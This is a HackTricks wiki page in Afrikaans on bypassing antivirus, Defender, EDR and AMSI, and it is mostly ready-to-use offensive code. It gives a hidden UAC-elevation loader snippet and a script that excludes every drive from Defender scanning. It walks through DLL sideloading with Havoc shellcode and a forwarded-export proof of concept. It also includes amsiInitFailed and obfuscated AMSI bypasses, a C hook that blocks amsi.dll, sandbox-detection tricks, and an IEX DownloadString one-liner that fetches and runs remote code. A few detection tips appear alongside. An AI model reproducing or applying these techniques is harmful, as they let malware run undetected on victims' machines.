# Omseiling van antivirusprogrammatuur (AV)

{{#include ../banners/hacktricks-training.md}}

**Hierdie bladsy is aanvanklik geskryf deur** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): 'n Gereedskap om te keer dat Windows Defender werk.
- [no-defender](https://github.com/es3n1n/no-defender): 'n Gereedskap om te keer dat Windows Defender werk deur 'n ander AV na te boots.
- [Deaktiveer Defender as jy admin is](basic-powershell-for-pentesters/README.md)

### Installer-styl UAC-lokmiddel voordat daar met Defender gepeuter word

Openbare loaders wat hulle as game cheats voordoen, word dikwels as ongetekende Node.js/Nexe-installers versprei wat eers **die gebruiker om verhoogde toestemmings vra** en Defender eers daarna onbruikbaar maak. Die proses is eenvoudig:

1. Toets vir administratiewe konteks met `net session`. Die opdrag slaag slegs wanneer die oproeper admin-regte het, dus dui 'n mislukking daarop dat die loader as 'n standaardgebruiker loop.
2. Herbegin homself onmiddellik met die `RunAs`-werkwoord om die verwagte UAC-toestemmingsprompt te aktiveer, terwyl die oorspronklike opdragreël behoue bly.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Slagoffers glo reeds dat hulle “cracked”-sagteware installeer, daarom aanvaar hulle gewoonlik die prompt, wat die malware die regte gee wat dit nodig het om Defender se beleid te verander.<sup>[[26]](#references)</sup>

### `MpPreference`-uitsluitings vir elke dryfletter

Sodra dit verhoogde regte het, maksimeer GachiLoader-agtige kettings Defender se blinde kolle eerder as om die diens heeltemal af te skakel. Die loader beëindig eers die GUI-waghond (`taskkill /F /IM SecHealthUI.exe`) en voeg dan **uiters breë uitsluitings** by sodat elke gebruikersprofiel, stelselgids en verwyderbare skyf nie geskandeer kan word nie:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Sleutelwaarnemings:

- Die lus gaan deur elke gemonteerde lêerstelsel (D:\, E:\, USB-stokkies, ens.) sodat **enige toekomstige payload wat enige plek op die skyf geplaas word, geïgnoreer word**.
- Die uitsluiting van die `.sys`-uitbreiding is voorsorggerig—aanvallers behou die opsie om later ongetekende drywers te laai sonder om weer aan Defender te raak.
- Alle veranderinge word onder `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` aangebring, sodat latere fases kan bevestig dat die uitsluitings voortduur of dit kan uitbrei sonder om UAC weer te aktiveer.

Omdat geen Defender-diens gestop word nie, rapporteer eenvoudige gesondheidstoetse steeds “antivirus aktief”, al raak intydse inspeksie nooit aan daardie paaie nie.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Tans gebruik AV’s verskillende metodes om na te gaan of ’n lêer kwaadwillig is of nie: statiese opsporing, dinamiese ontleding en, vir die meer gevorderde EDR’s, gedragsontleding.

### **Statiese opsporing**

Statiese opsporing word gedoen deur bekende kwaadwillige stringe of byte-skikkings in ’n binêre lêer of script te merk, en ook inligting uit die lêer self te onttrek (bv. lêerbeskrywing, maatskappynaam, digitale handtekeninge, ikoon, kontrolesom, ens.). Dit beteken dat die gebruik van bekende openbare nutsmiddels jou makliker kan laat uitvang, aangesien hulle waarskynlik ontleed en as kwaadwillig gemerk is. Daar is ’n paar maniere om hierdie soort opsporing te omseil:

- **Encryption**

As jy die binêre lêer enkripteer, sal AV nie jou program kan opspoor nie, maar jy sal ’n soort loader nodig hê om die program te dekripteer en in die geheue uit te voer.

- **Obfuscation**

Soms hoef jy net ’n paar stringe in jou binêre lêer of script te verander om dit by AV verby te kry, maar dit kan ’n tydrowende taak wees, afhangend van wat jy probeer verdoesel.

- **Custom tooling**

As jy jou eie nutsmiddels ontwikkel, sal daar geen bekende slegte handtekeninge wees nie, maar dit verg baie tyd en moeite.

> [!TIP]
> ’n Goeie manier om teen Windows Defender se statiese opsporing te toets, is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dit verdeel die lêer basies in verskeie segmente en laat Defender dan elkeen afsonderlik skandeer. Só kan dit jou presies wys watter stringe of grepe in jou binêre lêer gemerk word.

Ek beveel sterk aan dat jy hierdie [YouTube-snitlys](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV Evasion kyk.

### Vanlyn PE-kenmerktoetse vir statiese klassifiseerders

Gepakte of geënkripteerde payload-grepe is slegs een inset vir ’n statiese klassifiseerder. EMBER2024 onttrek PE-kenmerke, insluitend invoere, uitvoere, afdelings, kopstukke en Authenticode-data.<sup>[[48]](#references)</sup> In een loader-eksperiment het die byvoeging van 141 onskuldig lykende invoere die EMBER2024-kwaadwillige telling met 93% verlaag, terwyl invoere wat met malware geassosieer word, dit verhoog het. Dit is ’n resultaat vir daardie model en daardie monsters, nie ’n betroubare omseiling van ’n spesifieke AV/EDR-produk nie.<sup>[[50]](#references)</sup>

Hou vir ’n gemagtigde loader-toets die payload en uitvoeringspad konstant, verander een beoogde bouveranderlike per variant en vergelyk tellings vanlyn. Inspekteer die gevolglike PE-kenmerke, aangesien ’n bouverandering meer as een kenmerkgroep kan beïnvloed.<sup>[[49]](#references)[[50]](#references)</sup> Om beoogde invoere in die IAT te behou, roep die gekose Win32-API’s vanuit bereikbare kode aan. Wissel die keuse af en versprei oproeppunte oor bouweergawes, eerder as om ’n vaste kamoefleerfunksie te skep wat ’n handtekening kan word. Die eksperiment het ook laer tellings aangetoon met geldige kodesignering, uitvoerinskrywings en meer funksies wat `.pdata` vergroot; ongeldige signering het min effek gehad, en die `.pdata`-effek was klein.<sup>[[50]](#references)</sup>

Die `thrember`-pakket bied kenmerkonttrekking en maatstafmodelle. Nadat jy dit geïnstalleer het, gebruik `thrember.download_models("models")` met ’n bestaande `models`-gids en voer dan die tellingprogram vanuit die ouergids uit: die aflaaihelper verander die huidige werkgids. Die PE-klassifiseerder kan ’n gids met bouweergawes beoordeel sonder om dit by ’n skanderingsdiens in te dien:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Hou die model- en kenmerkekstraktor-weergawes vas tydens die vergelyking. ’n Laer vanlyn telling wys slegs hoe hierdie klassifiseerder op die veranderde binary reageer; dit bewys nie ontduiking van gedragsanalise, emulasie of ’n verskaffer se ander model nie.<sup>[[49]](#references)[[50]](#references)</sup> Sien die aparte uitvoeringsmodel vir [per-build-polimorfisme en camouflage van die buitenste binary in gevirtualiseerde payloads](virtualized-payload-execution.md#camouflaging-the-outer-go-executable).

### **Dynamic analysis**

Dynamic analysis is wanneer die AV jou binary in ’n sandbox laat loop en vir kwaadwillige aktiwiteit dophou (bv. probeer om jou blaaier se wagwoorde te dekripteer en te lees, ’n minidump van LSASS te maak, ens.). Dit kan ’n bietjie moeiliker wees om mee te werk, maar hier is ’n paar dinge wat jy kan doen om sandboxes te ontduik.

- **Slaap voor uitvoering** Afhangend van hoe dit geïmplementeer is, kan dit ’n uitstekende manier wees om AV se dynamic analysis te omseil. AV’s het baie min tyd om lêers te skandeer sonder om die gebruiker se werkvloei te onderbreek, dus kan lang slaapperiodes die ontleding van binaries ontwrig. Die probleem is dat baie AV-sandboxes die slaap kan oorslaan, afhangend van hoe dit geïmplementeer is.
- **Kontroleer die masjien se hulpbronne** Sandboxes het gewoonlik baie min hulpbronne beskikbaar (bv. < 2GB RAM), anders kan hulle die gebruiker se masjien vertraag. Jy kan ook baie kreatief raak, byvoorbeeld deur die CPU se temperatuur of selfs die waaierspoed te kontroleer; nie alles sal in die sandbox geïmplementeer wees nie.
- **Masjienspesifieke kontroles** As jy ’n gebruiker wil teiken wie se werkstasie aan die "contoso.local"-domein gekoppel is, kan jy die rekenaar se domein kontroleer om te sien of dit ooreenstem met die domein wat jy gespesifiseer het. Indien nie, kan jy jou program laat afsluit.

Dit blyk dat Microsoft Defender se Sandbox-rekenaarnaam HAL9TH is. Jy kan dus die rekenaarnaam in jou malware kontroleer voordat dit ontplof; as die naam HAL9TH is, beteken dit dat jy binne Defender se sandbox is, en kan jy jou program laat afsluit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>bron: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Nog ’n paar baie goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) om Sandboxes te ontduik

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev-kanaal</p></figcaption></figure>

Soos ons vroeër in hierdie plasing gesê het, sal **openbare tools** uiteindelik **bespeur word**. Jy behoort jouself dus iets af te vra:

As jy byvoorbeeld LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy ’n ander, minder bekende projek gebruik wat ook LSASS dump?

Laasgenoemde is waarskynlik die regte antwoord. Mimikatz is waarskynlik een van die malware-stukke wat die meeste deur AV’s en EDR’s gemerk word, indien nie die een wat die meeste gemerk word nie. Hoewel die projek self baie gaaf is, is dit ook ’n nagmerrie om daarmee te werk om AV’s te omseil. Soek dus bloot alternatiewe vir wat jy probeer bereik.

> [!TIP]
> Wanneer jy jou payloads vir ontduiking wysig, maak seker dat jy **outomatiese indiening van monsters** in Defender afskakel, en moet asseblief, ernstig, **NIE NA VIRUSTOTAL OPLAAI NIE** as jou doel is om ontduiking op die lang termyn te bereik. As jy wil nagaan of ’n bepaalde AV jou payload bespeur, installeer dit op ’n VM, probeer om outomatiese indiening van monsters af te skakel, en toets dit daar totdat jy tevrede is met die resultaat.

## EXEs vs DLLs

Wanneer dit moontlik is, **gee altyd voorkeur aan DLLs vir ontduiking**. Volgens my ervaring word DLL-lêers gewoonlik **baie minder bespeur en ontleed**, dus is dit ’n baie eenvoudige truuk om in sommige gevalle opsporing te vermy (as jou payload natuurlik op een of ander manier as ’n DLL kan loop).

Soos ons in hierdie beeld kan sien, het ’n DLL-payload van Havoc ’n bespeuringskoers van 4/26 op antiscan.me, terwyl die EXE-payload ’n bespeuringskoers van 7/26 het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me-vergelyking van ’n gewone Havoc EXE-payload met ’n gewone Havoc DLL</p></figcaption></figure>

Nou wys ons ’n paar truuks wat jy met DLL-lêers kan gebruik om baie meer onopvallend te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** benut die DLL-soekvolgorde wat die loader gebruik deur die slagoffertoepassing en kwaadwillige payload(s) langs mekaar te plaas.

Jy kan met [Siofra](https://github.com/Cybereason/siofra) en die volgende powershell-skrip kyk watter programme vatbaar is vir DLL Sideloading:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Hierdie opdrag sal die lys uitvoer van programme in "C:\Program Files\\" wat vatbaar is vir DLL hijacking, en die DLL-lêers wat hulle probeer laai.

Ek beveel sterk aan dat jy **self programme verken wat DLL Hijackable/Sideloadable is**. Hierdie tegniek is redelik stealthy wanneer dit behoorlik uitgevoer word, maar as jy programme gebruik wat publiek bekend is as DLL Sideloadable, kan jy maklik gevang word.

As jy bloot ’n kwaadwillige DLL plaas met die naam van ’n DLL wat ’n program verwag om te laai, sal jou payload nie laai nie, aangesien die program sekere spesifieke funksies in daardie DLL verwag. Om hierdie probleem op te los, sal ons ’n ander tegniek genaamd **DLL Proxying/Forwarding** gebruik.

**DLL Proxying** stuur die oproepe wat ’n program maak van die proxy (en kwaadwillige) DLL na die oorspronklike DLL aan, en behou sodoende die program se funksionaliteit terwyl jou payload uitgevoer kan word.

Ek gaan die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)-projek van [@flangvik](https://twitter.com/Flangvik/) gebruik.

Dit is die stappe wat ek gevolg het:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Die laaste opdrag sal vir ons 2 lêers gee: ’n DLL-bronkodesjabloon en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Hierdie is die resultate:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowel ons shellcode (geënkodeer met [SGN](https://github.com/EgeBalci/sgn)) as die proxy DLL het ’n Detection rate van 0/26 op [antiscan.me](https://antiscan.me)! Ek sou dit ’n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek **beveel sterk aan** dat jy [S3cur3Th1sShit se twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk, asook [ippsec se video](https://www.youtube.com/watch?v=3eROsG_WNpE), om meer te leer oor wat ons in meer besonderhede bespreek het.

### Misbruik van Forwarded Exports (ForwardSideLoading)

Windows PE-modules kan funksies uitvoer wat eintlik “forwarders” is: in plaas daarvan om na kode te wys, bevat die export-inskrywing ’n ASCII-string in die vorm `TargetDll.TargetFunc`. Wanneer ’n caller die export resolve, sal die Windows loader:

- `TargetDll` laai as dit nog nie gelaai is nie
- `TargetFunc` daaruit resolve

Belangrike gedrag om te verstaan:
- As `TargetDll` ’n KnownDLL is, word dit vanuit die beskermde KnownDLLs-namespace voorsien (bv. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- As `TargetDll` nie ’n KnownDLL is nie, word die normale DLL-soekvolgorde gebruik, wat die gids insluit van die module wat die forward-resolusie uitvoer.

Dit maak ’n indirekte sideloading-primitief moontlik: vind ’n ondertekende DLL wat ’n funksie uitvoer wat na ’n module met ’n naam wat nie ’n KnownDLL is nie, geforward word, en plaas dan dié ondertekende DLL saam met ’n aanvaller-beheerde DLL met presies dieselfde naam as die geforwarde teikenmodule. Wanneer die geforwarde export aangeroep word, resolve die loader die forward en laai jou DLL vanuit dieselfde gids, wat jou DllMain uitvoer.<sup>[[13]](#references)</sup>

Voorbeeld waargeneem op Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` is nie ’n KnownDLL nie, dus word dit volgens die normale soekvolgorde opgelos.

PoC (kopieer-plak):
1) Kopieer die ondertekende stelsel-DLL na ’n skryfbare vouer
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Plaas ’n kwaadwillige `NCRYPTPROV.dll` in dieselfde vouer. ’n Minimale DllMain is genoeg om kode-uitvoering te verkry; jy hoef nie die forwarded function te implementeer om DllMain te aktiveer nie.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Aktiveer die aanstuur met ’n ondertekende LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Waargenome gedrag:
- rundll32 (signed) laai die side-by-side `keyiso.dll` (signed)
- Terwyl `KeyIsoSetAuditingInterface` opgelos word, volg die loader die forward na `NCRYPTPROV.SetAuditingInterface`
- Die loader laai dan `NCRYPTPROV.dll` vanaf `C:\test` en voer sy `DllMain` uit
- As `SetAuditingInterface` nie geïmplementeer is nie, kry jy eers ’n "missing API"-fout nadat `DllMain` reeds uitgevoer is

Opsporingswenke:
- Fokus op forwarded exports waar die teikenmodule nie ’n KnownDLL is nie. KnownDLLs word gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Jy kan forwarded exports met gereedskap soos die volgende enumerasieer:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sien die Windows 11-forwarder-inventaris om na kandidate te soek: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Opsporings-/verdedigingsidees:
- Monitor LOLBins (bv. rundll32.exe) wat ondertekende DLLs vanaf nie-stelselpaadjies laai, gevolg deur die laai van nie-KnownDLLs met dieselfde basisnaam vanaf daardie gids
- Genereer ’n waarskuwing vir proses-/modulekettings soos: `rundll32.exe` → nie-stelsel-`keyiso.dll` → `NCRYPTPROV.dll` onder paadjies waarop gebruikers kan skryf
- Dwing kode-integriteitsbeleide af (WDAC/AppLocker) en verbied skryf- en uitvoertoegang in toepassinggidse

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Jy kan Freeze gebruik om jou shellcode op ’n geheimsinnige manier te laai en uit te voer.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion is net ’n kat-en-muisspeletjie: wat vandag werk, kan môre opgespoor word. Moet dus nooit op net een hulpmiddel staatmaak nie; probeer, indien moontlik, verskeie evasion-tegnieke aan mekaar koppel.

## Direct/Indirect Syscalls & SSN-resolusie (SysWhispers4)

EDR’s plaas dikwels **user-mode inline hooks** op `ntdll.dll`-syscall-stubs. Om hierdie hooks te omseil, kan jy **direct** of **indirect** syscall-stubs genereer wat die korrekte **SSN** (System Service Number) laai en na kernelmodus oorskakel sonder om die gehaakte export-entrypoint uit te voer.<sup>[[32]](#references)</sup>

**Aanroepopsies:**
- **Direct (embedded)**: voeg ’n `syscall`/`sysenter`/`SVC #0`-instruksie in die gegenereerde stub in (geen `ntdll`-export word geraak nie).
- **Indirect**: spring na ’n bestaande `syscall`-gadget binne `ntdll`, sodat dit lyk asof die kerneroorgang van `ntdll` afkomstig is (nuttig vir heuristiese evasion); **randomized indirect** kies per aanroep ’n gadget uit ’n poel.
- **Egg-hunt**: vermy dit om die statiese `0F 05`-opcode-volgorde op skyf in te sluit; los ’n syscall-volgorde tydens looptyd op.

**Hook-bestande SSN-resolusiestrategieë:**
- **FreshyCalls (VA sort)**: lei SSN’s af deur syscall-stubs volgens virtuele adres te sorteer, eerder as om die stub-grepe te lees.
- **SyscallsFromDisk**: koppel ’n skoon `\KnownDlls\ntdll.dll`, lees SSN’s uit sy `.text` en ontkoppel dit dan (omseil alle in-geheue-hooks).
- **RecycledGate**: kombineer VA-gesorteerde SSN-afleiding met opcode-validering wanneer ’n stub skoon is; val terug op VA-afleiding as dit gehaak is.
- **HW Breakpoint**: stel DR0 op die `syscall`-instruksie en gebruik ’n VEH om die SSN tydens looptyd uit `EAX` vas te lê, sonder om gehaakte grepe te ontleed.

Voorbeeldgebruik van SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[lêerlose wanware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik kon AV's net **lêers op skyf** skandeer, so as jy payloads op een of ander manier **direk in-memory** kon uitvoer, kon die AV niks doen om dit te voorkom nie, aangesien dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is in hierdie Windows-komponente geïntegreer.

- User Account Control, of UAC (verhoging van voorregte vir EXE-, COM- en MSI-lêers, of ActiveX-installasie)
- PowerShell (skripte, interaktiewe gebruik en dinamiese kode-evaluering)
- Windows Script Host (wscript.exe en cscript.exe)
- JavaScript en VBScript
- Office VBA-makro's

Dit stel antivirusoplossings in staat om skripgedrag te ondersoek deur skripinhoud bloot te stel in 'n vorm wat nie geënkripteer of verduister is nie.

As jy `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` uitvoer, sal Windows Defender die volgende waarskuwing gee.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let op hoe dit `amsi:` byvoeg, gevolg deur die pad na die uitvoerbare lêer waaruit die skrip uitgevoer is—in hierdie geval, powershell.exe.

Ons het geen lêer na skyf geskryf nie, maar is steeds in-memory opgespoor weens AMSI.

Verder word C#-kode vanaf **.NET 4.8** ook deur AMSI verwerk. Dit raak selfs `Assembly.Load(byte[])` wanneer dit gebruik word om in-memory-uitvoering te laai. Daarom word dit aanbeveel om laer weergawes van .NET (soos 4.7.2 of laer) vir in-memory-uitvoering te gebruik as jy AMSI wil ontduik.

Daar is 'n paar maniere om AMSI te omseil:

- **Obfuscation**

Aangesien AMSI hoofsaaklik statiese opsporing gebruik, kan die wysiging van die skripte wat jy probeer laai 'n goeie manier wees om opsporing te ontduik.

AMSI kan egter skripte deobfuscate, selfs al het hulle verskeie lae. Daarom kan obfuscation 'n swak opsie wees, afhangend van hoe dit gedoen word. Dit maak ontduiking nie juis eenvoudig nie. Soms hoef jy egter net 'n paar veranderlike name te verander en sal jy reg wees; dit hang dus af van hoe sterk iets gemerk is.

- **AMSI Bypass**

Omdat AMSI geïmplementeer word deur 'n DLL in die powershell-proses (ook cscript.exe, wscript.exe, ens.) te laai, is dit maklik om daarmee te peuter, selfs wanneer jy as 'n gebruiker sonder verhoogde voorregte werk. Weens hierdie fout in die implementering van AMSI het navorsers verskeie maniere gevind om AMSI-skandering te ontduik.

**Forseer 'n fout**

As AMSI-inisialisering gedwing word om te misluk (amsiInitFailed), sal geen skandering vir die huidige proses begin word nie. [Matt Graeber](https://twitter.com/mattifestation) het dit oorspronklik bekend gemaak, en Microsoft het 'n signature ontwikkel om wydverspreide gebruik te voorkom.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Al wat nodig was, was een reël PowerShell-kode om AMSI vir die huidige PowerShell-proses onbruikbaar te maak. Hierdie reël is natuurlik deur AMSI self gemerk, so ’n paar wysigings is nodig om hierdie tegniek te gebruik.

Hier is ’n aangepaste AMSI-bypass wat ek van hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) geneem het.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Hou in gedagte dat dit waarskynlik gemerk sal word sodra hierdie plasing verskyn, dus moet jy geen kode publiseer as jou plan is om onopgemerk te bly nie.

**Memory Patching**

Hierdie tegniek is aanvanklik deur [@RastaMouse](https://twitter.com/_RastaMouse/) ontdek. Dit behels dat die adres van die "AmsiScanBuffer"-funksie in amsi.dll gevind word (verantwoordelik vir die skandering van invoer wat deur die gebruiker verskaf word) en dat dit oorskryf word met instruksies om die kode vir E_INVALIDARG terug te gee. Op dié manier gee die werklike skandering se resultaat 0 terug, wat as ’n skoon resultaat geïnterpreteer word.

> [!TIP]
> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir ’n meer gedetailleerde verduideliking.

Daar is ook baie ander tegnieke om AMSI met powershell te omseil. Kyk na [**hierdie bladsy**](basic-powershell-for-pentesters/index.html#amsi-bypass) en [**hierdie repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) om meer daaroor te leer.

### AMSI COM scan-pointer redirection in plaas van `AmsiScanBuffer` patching

Nog ’n prosesplaaslike bypass laat die `AmsiScanBuffer`-entry point onaangeraak. In die gerapporteerde 64-bit .NET-loader word ’n AMSI COM-object vanaf CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec` geskep; `Marshal.GetIUnknownForObject()` lewer die koppelvlakpointer op, en die vtable-gleuf by offset `0x18` word as die scan-call-teiken gebruik. Die loader patch ’n native pointer vir `Console.Clear()` met ’n klein x64-stub, verander dan daardie vtable-inskrywing na die stub onder `VirtualProtect()` en herstel daarna die oorspronklike bladsybeskerming. Beide die 64-bit-pointerwydte en die verwagte COM-uitleg is voorvereistes; dit is nie ’n generiese offset vir willekeurige AMSI-interfaces of -builds nie. Die vroeër waargenome stadiums is [signed AppDomainManager sidecar loading](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) en [RESX deserialization](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Die waargenome stub-grepe is `41 C7 00 01 00 00 00 33 C0 C3`: hulle skryf **1** na die resultaatpointer in `r8` en gee **0** in `eax` terug. Die gerapporteerde bewering dat die scanresultaat `AMSI_RESULT_CLEAN` (0) is, verwar dus die `S_OK`-terugkeerwaarde met die uitvoer-enum. In die gedokumenteerde `AMSI_RESULT`-volgorde is resultaat **1** `AMSI_RESULT_NOT_DETECTED`; dit is steeds onder die opsporingsdrempel.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Blokkering van AMSI deur te verhoed dat amsi.dll laai (`LdrLoadDll` hook)

AMSI word slegs geïnisialiseer nadat `amsi.dll` in die huidige proses gelaai is. ’n Robuuste, taal-onafhanklike bypass is om ’n user-mode hook op `ntdll!LdrLoadDll` te plaas wat ’n fout teruggee wanneer die aangevraagde module `amsi.dll` is. Gevolglik laai AMSI nooit nie en vind geen skanderings vir daardie proses plaas nie.<sup>[[23]](#references)</sup>

Implementeringsraamwerk (x64 C/C++-pseudokode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Werk met PowerShell, WScript/CScript en pasgemaakte loaders (enigiets wat andersins AMSI sou laai).
- Kombineer dit met die voer van scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) om lang opdragreëlspore te vermy.
- Is al gebruik deur loaders wat via LOLBins uitgevoer word (bv. `regsvr32` wat `DllRegisterServer` aanroep).

Die hulpmiddel **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genereer ook scripts om AMSI te omseil.
Die hulpmiddel **[https://amsibypass.com/](https://amsibypass.com/)** genereer ook scripts om AMSI te omseil wat handtekeninge vermy deur ewekansige gebruikergedefinieerde funksies, veranderlikes en karakteruitdrukkings te gebruik, en ewekansige hooflettergebruik op PowerShell-sleutelwoorde toe te pas om handtekeninge te vermy.

**Verwyder die bespeurde handtekening**

